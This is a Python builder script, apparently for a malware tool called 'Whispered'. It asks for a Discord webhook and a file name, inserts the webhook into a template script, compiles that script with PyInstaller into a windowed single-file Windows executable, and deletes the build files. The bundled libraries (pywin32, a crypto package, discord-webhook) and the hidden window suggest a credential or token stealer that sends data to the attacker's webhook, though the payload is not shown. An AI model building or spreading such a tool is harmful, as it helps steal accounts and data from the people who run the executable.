import subprocess
import os
import shutil
from pystyle import *
from time import sleep

Whispered = """
 █     █░ ██░ ██  ██▓  ██████  ██▓███  ▓█████  ██▀███  ▓█████ ▓█████▄ 
▓█░ █ ░█░▓██░ ██▒▓██▒▒██    ▒ ▓██░  ██▒▓█   ▀ ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌
▒█░ █ ░█ ▒██▀▀██░▒██▒░ ▓██▄   ▓██░ ██▓▒▒███   ▓██ ░▄█ ▒▒███   ░██   █▌
░█░ █ ░█ ░▓█ ░██ ░██░  ▒   ██▒▒██▄█▓▒ ▒▒▓█  ▄ ▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌
░░██▒██▓ ░▓█▒░██▓░██░▒██████▒▒▒██▒ ░  ░░▒████▒░██▓ ▒██▒░▒████▒░▒████▓ 
░ ▓░▒ ▒   ▒ ░░▒░▒░▓  ▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒ 
  ▒ ░ ░   ▒ ░▒░ ░ ▒ ░░ ░▒  ░ ░░▒ ░      ░ ░  ░  ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒ 
  ░   ░   ░  ░░ ░ ▒ ░░  ░  ░  ░░          ░     ░░   ░    ░    ░ ░  ░ 
    ░     ░  ░  ░ ░        ░              ░  ░   ░        ░  ░   ░    
                                                               ░      
"""
System.Size(140, 40)
System.Title("Whispered")
System.Clear()

def Start():
    System.Clear()
    print("\n"*2)
    print(Colorate.Horizontal(Colors.red_to_purple, Center.XCenter(Whispered)))
    print("\n"*5)
    current_directory = os.getcwd()

    sleep(1.5)
    webhook = Write.Input("Enter your Discord Webhook : ", Colors.red_to_purple, interval=0.025)
    sleep(1.5)
    fname = Write.Input("\n\nEnter the file name : ", Colors.purple_to_red, interval=0.025)
    sleep(1.5)

    # Lire le contenu de "Whispered.py" et remplacer le webhook
    with open("Whispered.py", "r") as file:
        f = file.read()

    modified = f.replace("WebHook_URL", webhook)

    # Écrire le contenu modifié dans un nouveau fichier Python
    with open(fname + ".py", "w") as file2:
        file2.write(modified)

    # Spécifier le chemin du fichier généré par PyInstaller et son répertoire de sortie
    output_folder = current_directory + "\\EXE" 
    input_script = os.path.join(current_directory, f"{fname}.py")

    # Exécuter PyInstaller
    subprocess.run([
        "pyinstaller",
        "--noconfirm",
        "--onefile",
        "--windowed",
        "--collect-submodules=requests",
        "--collect-submodules=discord-webhook",
        "--collect-submodules=pywin32",
        "--collect-submodules=ycryptodome",
        "--distpath", output_folder,
        input_script
    ], shell=True)

    # Nettoyage des fichiers inutiles
    shutil.rmtree('build', ignore_errors=True)  # Supprime le dossier "build"
    spec_file = fname + ".spec"
    if os.path.exists(spec_file):
        os.remove(spec_file)  # Supprime le fichier .spec
    if os.path.exists(input_script):
        os.remove(input_script)

Start()